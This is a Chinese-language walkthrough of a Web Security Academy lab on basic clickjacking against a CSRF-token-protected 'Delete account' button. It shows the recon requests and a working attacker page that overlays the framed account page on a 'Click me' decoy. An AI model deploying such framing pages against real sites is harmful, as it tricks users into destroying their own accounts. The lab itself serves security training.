# 实验室：带有 CSRF 令牌防护的基本点击劫持

本实验室包含登录功能和一个受 CSRF 令牌保护的“删除账户”按钮。用户会点击诱饵网站上显示“click”一词的元素。

要解决本实验，请构造一些 HTML，将账户页面嵌入框架，并诱骗用户删除其账户。当账户被删除时，实验即被解决。

你可以使用以下凭据登录自己的账户：`wiener:peter`

> **注意**
> 受害者将使用 Chrome，因此请在该浏览器上测试你的漏洞利用。

## 步骤

侦察
- 登录后访问账户页面
    ```http
    GET /my-account?id=wiener HTTP/2
    Host: id.web-security-academy.net
    ```
    - 响应
        ```http
        HTTP/2 200 OK
        Content-Type: text/html; charset=utf-8
        Cache-Control: no-cache
        Content-Length: 3831

        <form id=delete-account-form action="/my-account/delete" method="POST">
            <input required type="hidden" name="csrf" value="UNMPksRhmCmk6S2K0W5ylBFO1XHJULpE">
            <button class="button" type="submit">
                Delete account
            </button>
        </form>
        ```
        - 服务器并不禁止子框架


构建点击劫持
- 调试攻击者页面
    ```html
    <head>
        <style>
            #target_website {
                position:relative;
                width:600px;
                height:600px;
                opacity:0.5;
                z-index:2;
                }
            #decoy_website {
                position: absolute;
                z-index: 1;
                width: 50px;
                height: 50px;
                margin-left: 50px;
                margin-top: 20px;
                top: 495px;
                left: 30px;
                }
        </style>
    </head>

    <body>
        <div id="decoy_website">
            Click me
        </div>
        <iframe id="target_website" src="https://id.web-security-academy.net/my-account#delete-account-form">
        </iframe>
    </body>
    ```
    - URL 移除或设置查询参数中的 `id`，使用 `#` 片段符聚焦目标功能
    - 此时的透明的为调试用的可见参数，而不是最终的接近透明
    - 使用浏览器的开发者工具中的“样式”栏调整边距
    - 调整完成后右键复制 CSS 样式
